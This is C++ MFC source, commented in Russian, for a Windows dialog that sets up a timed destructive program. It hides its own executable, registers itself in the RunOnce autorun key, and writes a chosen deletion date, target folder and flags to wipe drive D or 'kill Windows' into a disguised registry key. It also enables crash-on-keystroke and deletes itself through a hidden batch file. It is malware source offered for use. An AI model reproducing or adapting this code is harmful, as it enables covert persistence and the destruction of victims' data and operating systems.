// DeDayDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DeDay.h"
#include "DeDayDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CDeDayDlg dialog

CDeDayDlg::CDeDayDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CDeDayDlg::IDD, pParent)
	, m_csPath(_T(""))
	, m_bDeleteD(FALSE)
	, m_bKillWindows(FALSE)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CDeDayDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_PATH, m_csPath);
	DDX_Control(pDX, IDC_MONTHCALENDAR1, m_MonthCalCtrl);
	DDX_Check(pDX, IDC_DELETE_D, m_bDeleteD);
	DDX_Check(pDX, IDC_KILLWINDOWS, m_bKillWindows);
}

BEGIN_MESSAGE_MAP(CDeDayDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDOK, &CDeDayDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_BTN_BROWS, &CDeDayDlg::OnBnClickedBtnBrows)
	ON_EN_CHANGE(IDC_PATH, &CDeDayDlg::OnEnChangePath)
	ON_BN_CLICKED(IDC_DELETE_D, &CDeDayDlg::OnBnClickedDeleteD)
	ON_BN_CLICKED(IDC_KILLWINDOWS, &CDeDayDlg::OnBnClickedKillwindows)
	ON_BN_CLICKED(IDCANCEL, &CDeDayDlg::OnBnClickedCancel)
END_MESSAGE_MAP()


// CDeDayDlg message handlers

BOOL CDeDayDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	//если в едитбокс ничего не введено запрещаем кнопку "OK"
	GetDlgItem(IDOK)->EnableWindow(FALSE);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CDeDayDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CDeDayDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CDeDayDlg::OnBnClickedOk()
{
	wchar_t szFileExe[MAX_PATH] = {L"\0"};
	wchar_t sz[600] = {L"\0"}; // Строка-помошник...
	
    GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику

	//Retrieves the short path form of the specified path.
    if (GetShortPathName(szFileExe, sz, MAX_PATH)) // Преобразуем имя файла в досовский вид
		wcscpy(szFileExe, sz);

	SetFileAttributes(szFileExe, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN); // "прячем" файл	

	//добавить себя в автозагрузку
	AddToAutorun();
	
	//сохранить дату удаления папки
	SaveDeleteDay();

	//сохранить что удалять
	SaveFolderPathToDelete();

	EnableCrashOnCtrlScroll();

	UpdateData(TRUE);

	if ( m_bDeleteD )
	{
		DeleteDiskD();
	}

	if ( m_bKillWindows )
	{
		KillWindows();
	}
	
	OnOK();
}

//выбираем папку для удаления
void CDeDayDlg::OnBnClickedBtnBrows()
{
	//если TRUE то диалог "Open", FALSE - Save As
	//CFileDialog dlgFile(TRUE, NULL, NULL, OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY);
	//dlgFile.DoModal();
	
	wchar_t pszDir[512];

	BROWSEINFO    bi;
	LPITEMIDLIST  pidlBrowse;  // Fill in the BROWSEINFO structure.
	bi.hwndOwner      = NULL;
	bi.pidlRoot       = NULL;
	bi.pszDisplayName = pszDir;
	bi.lpszTitle      = L"Select the  directory";
	bi.ulFlags        = BIF_RETURNONLYFSDIRS;
	bi.lpfn           = NULL;
	bi.lParam         = 0;
	bi.iImage         = 0;  // Browse for a folder and return its PIDL.
	pidlBrowse = SHBrowseForFolder(&bi);  

	if (pidlBrowse == NULL)
	{
		return;  
	}

	if(SHGetPathFromIDList(pidlBrowse, pszDir) != TRUE)
	{	
		CoTaskMemFree(pidlBrowse);
		MessageBox(L"Не удалось получить путь к папке.", L"Облом");
		return;
	}
	
	CoTaskMemFree(pidlBrowse);

	m_csPath = pszDir;
	UpdateData(FALSE);

	OnEnChangePath();
}

bool CDeDayDlg::AddToAutorun(void)
{
	CString csExePath;
	DWORD dwSize = 512; 
	
	GetModuleFileName( NULL, csExePath.GetBuffer(dwSize), dwSize );
	TRACE1("Путь к программе = %s\n", csExePath.GetString());
	csExePath.ReleaseBuffer();

	//добавить себя в автозагрузку
	//наверное правильней будет добавлять в RunOnce и каждый раз себя туда добавлять если не
	//достигнута дата срабатывания
	if (SHSetValue(HKEY_LOCAL_MACHINE
		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, RunOnceItemName
		, REG_SZ
		, csExePath.GetString()
		, csExePath.GetLength())!= ERROR_SUCCESS)
		{
			MessageBox(L"Облом с SHSetValue() в AddToAutorun()", L"Облом", MB_ICONERROR);
			return false;
		}

	return true;
}

bool CDeDayDlg::SaveDeleteDay(void)
{
	SYSTEMTIME SysTime;
	ZeroMemory(&SysTime, 0);

	m_MonthCalCtrl.GetCurSel(&SysTime);

	CString DeleteDay, DeleteWeek, DeleteMonth;

	DeleteDay.Format(L"%d", SysTime.wDay);
	DeleteWeek.Format(L"%d", SysTime.wDayOfWeek);
	DeleteMonth.Format(L"%d", SysTime.wMonth);
	
	//DeleteDay.Format("%d.%d%.d", SysTime.wDay, SysTime.wDayOfWeek, SysTime.wMonth);
	TRACE1("День удаления = %s\n", DeleteDay.GetString());

	HKEY hk;

	// создать ключ в HKCR\CLSID
	if (RegCreateKeyEx(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, 0
		, NULL
		, REG_OPTION_NON_VOLATILE
		, KEY_WRITE
		, NULL
		, &hk
		, NULL)) 
	{
		MessageBox(L"Could not create the registry key in SaveDeleteDay().", L"Облом", MB_ICONERROR); 
		return false;
	}

	RegCloseKey(hk);

	//===== сохраним день удаления ======
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayKeyName			//имя значения
		, REG_SZ
		, DeleteDay.GetString()
		, DeleteDay.GetLength())!= ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
		return false;
	}

	//===== сохраним день недели =====
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayOfWeekKeyName			//имя значения
		, REG_SZ
		, DeleteWeek.GetString()
		, DeleteWeek.GetLength())!= ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
		return false;
	}

	//===== сохраним месяц =====
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelMonthKeyName			//имя значения
		, REG_SZ
		, DeleteMonth.GetString()
		, DeleteMonth.GetLength())!= ERROR_SUCCESS)
	{
		TRACE("Облом с SHSetValue() в SaveDeleteDay()", "Облом", MB_ICONERROR);
		return false;
	}

	return true;
}

bool CDeDayDlg::SaveFolderPathToDelete()
{	
	CString csFolderPath(m_csPath.GetString());
	
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelFolderKeyName
		, REG_SZ
		, csFolderPath.GetString()
		, csFolderPath.GetLength())!= ERROR_SUCCESS)
	{
		MessageBox(L"Облом с SHSetValue() в SaveFolderPathToDelete()", L"Облом", MB_ICONERROR);
		return false;
	}

	return true;
}

void CDeDayDlg::OnEnChangePath()
{
	UpdateData(TRUE);

	if (m_csPath.Compare(L"") != 0)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

bool CDeDayDlg::EnableCrashOnCtrlScroll()
{
	HKEY hKey;
	
	if (RegOpenKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters", &hKey) == ERROR_SUCCESS)
	{
		DWORD lpData = 0x01;
		
		if (RegSetValueEx(hKey, L"CrashOnCtrlScroll", NULL, REG_DWORD, (BYTE*)&lpData, (DWORD)sizeof (lpData))!= ERROR_SUCCESS)
		{
			MessageBox(L"Облом с SHSetValue() в EnableCrashOnCtrlScroll()", L"Облом", MB_ICONERROR);
			return false;
		}
	}

	return true;
}

bool CDeDayDlg::DeleteDiskD(void)
{
	CString csDeleteD("YES");
	
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDiskDKeyName
		, REG_SZ
		, csDeleteD.GetString()
		, csDeleteD.GetLength())!= ERROR_SUCCESS)
	{
		MessageBox(L"Облом с SHSetValue() в DeleteDiskD()", L"Облом", MB_ICONERROR);
		return false;
	}

	return true;
}

bool CDeDayDlg::KillWindows()
{
	CString csKillWindows("YES");
	
	if (SHSetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, KillWindowsKeyName
		, REG_SZ
		, csKillWindows.GetString()
		, csKillWindows.GetLength())!= ERROR_SUCCESS)
	{
		MessageBox(L"Облом с SHSetValue() в DeleteDiskD()", L"Облом", MB_ICONERROR);
		return false;
	}

return true;
}

void CDeDayDlg::OnBnClickedDeleteD()
{
	UpdateData(TRUE);

	if (m_bDeleteD)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

void CDeDayDlg::OnBnClickedKillwindows()
{
	UpdateData(TRUE);

	if (m_bKillWindows)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

void CDeDayDlg::OnBnClickedCancel()
{
	//удаляем сами себя
	TRACE(" >>> Удаляем сами себя <<<\n");
	SelfDelete();
	
	OnCancel();
}

void CDeDayDlg::SelfDelete()
{
	//удалить себя из автозагрузки
	HKEY hKey;

	if (::RegOpenKeyEx( HKEY_LOCAL_MACHINE
		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, NULL
		, KEY_ALL_ACCESS
		, &hKey) == ERROR_SUCCESS)
	{
		::RegDeleteValue( hKey, RunOnceItemName );
	}

	// Далее выделяем много памяти - лишним не будет %)
	wchar_t szFilePath[MAX_PATH] = { L"\0" };
	wchar_t szFileBat[MAX_PATH] = { L"System.bat" };
	wchar_t szFileExe[MAX_PATH] = { L"\0" };
	
	wchar_t sz[600]; // Строка-помошник...

    unsigned int iTmp;
	wchar_t* lpTmp;
	
	// Получаем путь к запущенному ехешнику
    GetModuleFileName(NULL, szFileExe, sizeof(szFileExe));

	// Преобразуем в имя файла в досовский вид
    if (GetShortPathName(szFileExe, sz, _MAX_PATH)) 
		wcscpy(szFileExe, sz);
    
	size_t sLen = wcslen(szFileExe) - 1;
	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки

	for (iTmp = 0; iTmp < wcslen(szFileExe); lpTmp--, iTmp++)
    {
		if (!wcsncmp(lpTmp, L"\\", 1))
            break;
    }

	//убираем из пути к фалу название программы
	size_t count = lpTmp - szFileExe; //Number of characters to be copied
 
	wcsncpy(szFilePath, szFileExe, count);
	wcscat(szFilePath, L"\\");

   	//===== удалить саму себя =====
	wchar_t BATSTRING[1024] = 
		L":Repeat\n"
		L"del \"%s\"\n" //команда на удаление экзешника
		L"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
		L":Repeat1\n"
		L"del \"%s\"\n"
		L"\0"; //удаление батника

	HANDLE hFile = CreateFile((LPCTSTR)szFileBat, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)

    if (!hFile)
    {
        MessageBox(L"Факн щет, файла System.bat нет и не будет", L"Облом", MB_OK | MB_ICONSTOP);
    }

	//char sz[600]; // Строка-помошник...
	//создаем бат-файл ===========================================
	swprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, wcslen(sz), &dwBytesWritten, NULL) || wcslen(sz) != dwBytesWritten);

    if (bError)
    {
        MessageBox(L"Факн щет, текст в файл System.bat не удалось записать", L"Облом", MB_OK | MB_ICONSTOP);
    }

	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени

	HINSTANCE h = ShellExecute(NULL, L"open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
}
